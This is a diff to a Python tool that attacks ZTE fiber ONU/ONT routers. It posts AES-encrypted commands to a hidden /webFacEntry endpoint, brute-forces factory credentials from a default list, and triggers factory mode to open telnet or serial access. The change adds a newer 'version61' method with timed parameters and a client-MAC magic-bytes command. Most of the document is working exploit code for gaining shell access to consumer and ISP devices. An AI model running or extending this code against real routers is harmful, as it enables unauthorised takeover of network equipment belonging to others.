@@ -2,8 +2,11 @@
 # -*- coding: utf-8 -*-
 import requests
 import argparse
-from random import Random
+from random import Random, SystemRandom
 from Crypto.Cipher import AES
+
+from zte_payload import client_mac as select_client_mac
+from zte_payload import format_mac, mac_to_magic_bytes
 
 
 def pad(data_to_pad, block_size):
@@ -47,11 +50,14 @@ class WebFac:
         0x4F, 0x67, 0xEC, 0x97, 0xF4, 0x99
     ]
 
-    def __init__(self, ip, port, user, pw) -> None:
+    def __init__(self, ip, port, user, pw, new_method=False, selected_mac=None) -> None:
         self.ip = ip
         self.port = port
         self.user = user
         self.pw = pw
+        self.new_method = new_method
+        self.client_mac = selected_mac
+        self.auth_time = None
         self.S = requests.Session()
 
     def reset(self):
@@ -112,8 +118,9 @@ class WebFac:
 
     def sendInfo(self):
         try:
+            command = self.sendInfoCommand()
             resp = self.S.post(f"http://{self.ip}:{self.port}/webFacEntry",
-                               data=self.chiper.encrypt(pad(f'SendInfo.gch?info=6|'.encode(), 16)))
+                               data=self.chiper.encrypt(pad(command, 16)))
             # print(resp.status_code, repr(resp.text))
             if resp.status_code == 200:
                 return True
@@ -125,13 +132,21 @@ class WebFac:
             print(e)
         return False
 
+    def sendInfoCommand(self):
+        if not self.new_method:
+            return b'SendInfo.gch?info=6|'
+        if self.client_mac is None:
+            raise ValueError("the new method requires the client MAC observed by the ONU/ONT")
+        return b'SendInfo.gch?info=12|' + mac_to_magic_bytes(self.client_mac)
+
     def checkLoginAuth(self):
         try:
+            command = self.checkLoginAuthCommand()
             resp = self.S.post(
                 f"http://{self.ip}:{self.port}/webFacEntry",
                 data=self.chiper.encrypt(
                     # httpd will alloc 1 more byte to ensure null terminated, anyway we add one more null to ensure
-                    pad(f'CheckLoginAuth.gch?version50&user={self.user}&pass={self.pw}'.encode(), 16)
+                    pad(command, 16)
                 ))
             # print(repr(resp.text))
             if resp.status_code == 200:
@@ -154,10 +169,19 @@ class WebFac:
             print(e)
         return False
 
+    def checkLoginAuthCommand(self):
+        if not self.new_method:
+            return f'CheckLoginAuth.gch?version50&user={self.user}&pass={self.pw}'.encode()
+        self.auth_time = SystemRandom().randint(0, 999)
+        return (
+            f'CheckLoginAuth.gch?time{self.auth_time}&version61'
+            f'&user={self.user}&pass={self.pw}'
+        ).encode()
+
 
 class WebFacSerial(WebFac):
-    def __init__(self, ip, port, user, pw) -> None:
-        super().__init__(ip, port, user, pw)
+    def __init__(self, ip, port, user, pw, new_method=False, selected_mac=None) -> None:
+        super().__init__(ip, port, user, pw, new_method, selected_mac)
 
     def serialSlience(self, action):
         try:
@@ -177,24 +201,15 @@ class WebFacSerial(WebFac):
 
 
 class WebFacTelnet(WebFac):
-    def __init__(self, ip, port, user, pw) -> None:
-        super().__init__(ip, port, user, pw)
+    def __init__(self, ip, port, user, pw, new_method=False, selected_mac=None) -> None:
+        super().__init__(ip, port, user, pw, new_method, selected_mac)
 
     def factoryMode(self, action):
         try:
-            if action == 'close':
-                resp = self.S.post(
-                    f"http://{self.ip}:{self.port}/webFacEntry",
-                    data=self.chiper.encrypt(
-                        pad(f'FactoryMode.gch?{action}'.encode(), 16)
-                    ))
-            else:
-                # mode 1:ops 2:dev 3:production 4:user
-                resp = self.S.post(
-                    f"http://{self.ip}:{self.port}/webFacEntry",
-                    data=self.chiper.encrypt(
-                        pad('FactoryMode.gch?mode=2&user=notused'.encode(), 16)
-                    ))
+            command = self.factoryModeCommand(action)
+            resp = self.S.post(
+                f"http://{self.ip}:{self.port}/webFacEntry",
+                data=self.chiper.encrypt(pad(command, 16)))
             # print(repr(resp.text))
             if resp.status_code == 200:
                 # resp should be "FactoryModeAuth.gch?user=<telnetuser>&pass=<telnetpass>"
@@ -211,12 +226,23 @@ class WebFacTelnet(WebFac):
             print(e)
         return False
 
+    def factoryModeCommand(self, action):
+        if action == 'close':
+            return b'FactoryMode.gch?close'
+        if not self.new_method:
+            # mode 1:ops 2:dev 3:production 4:user
+            return b'FactoryMode.gch?mode=2&user=notused'
+        if self.auth_time is None:
+            raise ValueError("new factory mode requires a completed authentication step")
+        mode_time = SystemRandom().randint(self.auth_time, 999)
+        return f'FactoryMode.gch?time{mode_time}&mode=2&user=fuckyou'.encode()
 
-def dealFacAuth(Class: WebFac, ip, port, users, pws):
+
+def dealFacAuth(Class: WebFac, ip, port, users, pws, new_method=False, selected_mac=None):
     for user in users:
         for pw in pws:
             print(f"trying  user:\"{user}\" pass:\"{pw}\" ")
-            webfac: WebFac = Class(ip, port, user, pw)
+            webfac: WebFac = Class(ip, port, user, pw, new_method, selected_mac)
             print("reset facTelnetSteps:")
             if webfac.reset():
                 print("reset OK!\n")
@@ -254,8 +280,8 @@ def dealFacAuth(Class: WebFac, ip, port, users, pws):
     return False
 
 
-def dealSerial(ip, port, users, pws, action):
-    serial = dealFacAuth(WebFacSerial, ip, port, users, pws)
+def dealSerial(ip, port, users, pws, action, new_method=False, selected_mac=None):
+    serial = dealFacAuth(WebFacSerial, ip, port, users, pws, new_method, selected_mac)
     if not serial:
         return
 
@@ -266,8 +292,8 @@ def dealSerial(ip, port, users, pws, action):
     return
 
 
-def dealTelnet(ip, port, users, pws, action):
-    telnet = dealFacAuth(WebFacTelnet, ip, port, users, pws)
+def dealTelnet(ip, port, users, pws, action, new_method=False, selected_mac=None):
+    telnet = dealFacAuth(WebFacTelnet, ip, port, users, pws, new_method, selected_mac)
     if not telnet:
         print('No Luck!')
         return
@@ -293,6 +319,11 @@ def parseArgs():
                         "1620@CTCC", "1620@CUcc", "admintelecom", "cuadmin", "lnadmin"])
     parser.add_argument('--ip', help='route ip', default="192.168.1.1")
     parser.add_argument('--port', help='router http port', type=int, default=80)
+    parser.add_argument('--new', dest='new_method', action='store_true',
+                        help='use the newer time-qualified version61 method')
+    mac_group = parser.add_mutually_exclusive_group()
+    mac_group.add_argument('--iface', help='network interface whose MAC is observed by the ONU/ONT')
+    mac_group.add_argument('--mac', '-m', help='exact client MAC observed by the ONU/ONT')
     subparsers = parser.add_subparsers(dest='cmd', title='subcommands',
                                        description='valid subcommands',
                                        help='supported commands')
@@ -307,11 +338,21 @@ def parseArgs():
 
 def main():
     args = parseArgs()
+    selected_mac = None
+    if args.new_method:
+        try:
+            selected_mac, source = select_client_mac(args.ip, args.port, args.mac, args.iface)
+        except (OSError, RuntimeError, ValueError) as error:
+            raise SystemExit("cannot select the ONU/ONT-visible client MAC: %s" % error)
+        print("new method client MAC: %s (%s)" % (format_mac(selected_mac), source))
+
     # print(args)
     if args.cmd == 'serial':
-        dealSerial(args.ip, args.port, args.user, args.pw, args.action)
+        dealSerial(args.ip, args.port, args.user, args.pw, args.action,
+                   args.new_method, selected_mac)
     elif args.cmd == 'telnet':
-        dealTelnet(args.ip, args.port, args.user, args.pw, args.action)
+        dealTelnet(args.ip, args.port, args.user, args.pw, args.action,
+                   args.new_method, selected_mac)
 
 
 if __name__ == '__main__':
